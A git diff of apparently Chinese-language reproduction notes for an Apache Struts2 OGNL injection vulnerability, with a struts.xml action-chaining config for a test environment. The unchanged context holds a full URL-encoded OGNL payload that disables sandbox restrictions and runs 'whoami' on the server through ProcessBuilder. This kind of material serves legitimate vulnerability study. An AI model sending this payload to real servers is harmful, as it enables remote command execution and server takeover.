@@ -10,7 +10,7 @@ FN@悬镜安全实验室
 $%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23cmd%3D'whoami').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd.exe','/c',%23cmd%7D%3A%7B'/bin/bash','-c',%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream(),%23ros)).(%23ros.flush())%7D
 ```
 
-注意：/不能编码为%2f，这个坑了好久
+注意：/不能编码为%2f，这个坑了好久，tomcat的原因
 
 ## 漏洞环境
 
@@ -53,16 +53,16 @@ tomcat+war即可
 	<package name="actionchaining" extends="struts-default">
 		<action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1">
 			<result type="chain">
-                <param name = "actionName">register2</param>
-            </result>
+				<param name = "actionName">register2</param>
+			</result>
 		</action>
 		<action name="actionChain2" class="org.apache.struts2.showcase.actionchaining.ActionChain2">
 			<result type="chain">xxx</result>
 		</action>
 		<action name="actionChain3" class="org.apache.struts2.showcase.actionchaining.ActionChain3">
 			<result type="postback">
-                <param name = "actionName">register2</param>
-            </result>
+				<param name = "actionName">register2</param>
+			</result>
 		</action>
 	</package>
 </struts>
